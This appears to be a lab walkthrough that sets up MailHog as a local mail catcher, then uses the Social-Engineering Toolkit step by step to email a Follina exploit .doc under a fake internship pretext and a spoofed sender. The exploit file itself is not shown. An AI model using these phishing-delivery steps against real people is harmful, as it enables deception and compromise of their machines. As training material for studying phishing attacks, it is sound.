Download MailHog for simulating email service.
```
wget https://github.com/mailhog/MailHog/releases/download/v1.0.1/MailHog_linux_amd64
chmod +x MailHog_linux_amd64
```

Run MailHog service.
Default port for SMTP: 1025
Default port for Web UI: 8025
```
mailhog
```

Open MailHog on Windows Server for downloading follina file.
```
10.0.2.4:8025
```

Use Social Engineering Toolkit (SET) to send follina file to receiver using email.

1. **Run as root to use SET.**
```
sudo setoolkit
```

2. **Select Social-Engineering Attacks.**
```
1
```

3. **Select to send malicious file by email.**
```
5
```

4. **Enter 1 to send email to a single email .**
```
1
```

5. **Enter 2 to select one-time use email template.**
```
2
```

6. **Enter subject of email**
```
Internship
```

7. **Set messsage to be sent as html**
```
h
```

8. **Enter body of email.**
```
Hello, my name is ... I want to take an internship at ... here is the file regarding internship.
```

9. **Enter receiver email.**
```
example@gmail.com
```

10. **Enter 2 to use own server or open relay for attacking.**
```
2
```

11. **Enter attacker email, what the reciever will see and app password for this gmail.**
```
attacker@test.com
attacker
```

12. **Enter SMTP server address and port for SMTP server port.**
```
10.0.2.4
1025
```

13. **Enter y to flag the email as high priority.**
```
yes
```

14. **Enter y to add an attachment.**
```
y
```

15. **Enter path to the follina file from kali side.**
```
/home/kali/follina/msdt-follina/follina.doc
```

16. **Enter n regarding adding an inline attachment.**
```
n
```

